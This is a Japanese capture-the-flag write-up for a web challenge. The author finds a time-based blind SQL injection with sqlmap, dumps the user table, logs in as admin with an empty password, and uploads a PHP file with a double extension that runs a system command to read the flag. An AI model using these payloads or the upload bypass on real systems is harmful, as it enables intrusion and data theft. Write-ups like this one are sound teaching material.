# KnowMe:Web:100pts
Only someone that knows me can solve me  
Do you know me?  
[https://typhooncon-knowme.chals.io/](https://typhooncon-knowme.chals.io/)  
Flag format: SSD{...}  

# Solution
URLが渡される。  
アクセスすると、ログインフォームのようだ。  
Uploader  
[site1.png](site/site1.png)  
ページタイトル以外の手がかりは無いため、ひとまずdirbをかける。  
```bash
$ dirb https://typhooncon-knowme.chals.io/
~~~
---- Scanning URL: https://typhooncon-knowme.chals.io/ ----
==> DIRECTORY: https://typhooncon-knowme.chals.io/css/
+ https://typhooncon-knowme.chals.io/index.php (CODE:200|SIZE:1015)
+ https://typhooncon-knowme.chals.io/robots.txt (CODE:200|SIZE:25)
==> DIRECTORY: https://typhooncon-knowme.chals.io/uploads/
~~~
```
`/robots.txt`や`/uploads/`などが見つかった。  
現状は許可されていないが、ログイン後に`/uploads/`にファイルをアップロードできそうだ。  
`/robots.txt`を見ると以下のようであった。  
```bash
$ curl https://typhooncon-knowme.chals.io/robots.txt
/items.php
/var/www/flag
```
フラグの場所は`/var/www/flag`のようで、`/items.php`なるものがあるようだ。  
アクセスしてみると`sort parameter required.`とのメッセージが返ってきたため、言われた通りクエリパラメータを付加してみる。  
```bash
$ curl https://typhooncon-knowme.chals.io/items.php
sort parameter required.
$ curl https://typhooncon-knowme.chals.io/items.php?sort=1
{"id":3,"count":2,"itemName":"CTFCreators"}
$ curl https://typhooncon-knowme.chals.io/items.php?sort=2
{"id":1,"count":22,"itemName":"Labtop"}
$ curl https://typhooncon-knowme.chals.io/items.php?sort=3
{"id":2,"count":12,"itemName":"test"}
```
何らかのデータをソートした先頭を取得しているようだ。  
SQLのwhereにクエリ部分が入っていそうであるため、SQLiを狙ってsqlmapを利用する。  
```bash
$ sqlmap -u "https://typhooncon-knowme.chals.io/items.php?sort=1" --dbs
~~~
---
Parameter: sort (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: sort=1 AND (SELECT 8339 FROM (SELECT(SLEEP(5)))loyl)
---
~~~
available databases [5]:
[*] information_schema
[*] knowmeDB
[*] mysql
[*] performance_schema
[*] sys
~~~
$ sqlmap -u "https://typhooncon-knowme.chals.io/items.php?sort=1" -D knowmeDB --tables
~~~
Database: knowmeDB
[3 tables]
+-------------+
| items       |
| resetTokens |
| users       |
+-------------+
~~~
$ sqlmap -u "https://typhooncon-knowme.chals.io/items.php?sort=1" -D knowmeDB -T users --dump
~~~
Database: knowmeDB
Table: users
[3 entries]
+----+-------------------------+--------------------------------------------+-------------+
| id | email                   | password                                   | username    |
+----+-------------------------+--------------------------------------------+-------------+
| 1  | admin@admin.com         | d41d8cd98f00b204e9800998ecf8427e (<empty>) | admin       |
| 2  | test@test.com           | d41d8cd98f00b204e9800998ecf8427e (<empty>) | test        |
| 3  | CTFCreators@twitter.com | d41d8cd98f00b204e9800998ecf8427e (<empty>) | CTFCreators |
+----+-------------------------+--------------------------------------------+-------------+
~~~
```
adminのパスワードは空のようだ。  
フロントでは入力が必須とされているので、HTMLを書き換えるかリクエストデータを書き換えてやればよい。  
ログインに成功すると、何かファイルをアップロードできるようだ。  
Profile  
[site2.png](site/site2.png)  
phpファイルのアップロードを狙うが、`Extention (php) not allowed`と怒られる。  
様々な拡張子がブロックされているようだ。  
いくつかの拡張子を調査すると`.png`が許可されていることがわかり、二重拡張子`.png.php`を試すとこれもアップロードに成功した。  
次のようなphpを`satoki.png.php`と名前を付けアップロードしてやればよい。  
```php
<?php echo system("cat /var/www/flag") ?>
```
アップロードすると`The file satoki.png.php has been uploaded.`と言われるので、dirbで発見した`/uploads/`下を見てやる。  
```bash
$ curl https://typhooncon-knowme.chals.io/uploads/satoki.png.php
Do you know this?
SSD{9a0c843a03de8e257b1068a8659be56ac06991f3}
Do you know that?Do you know that?
```
flagが読み取れた。  

## SSD{9a0c843a03de8e257b1068a8659be56ac06991f3}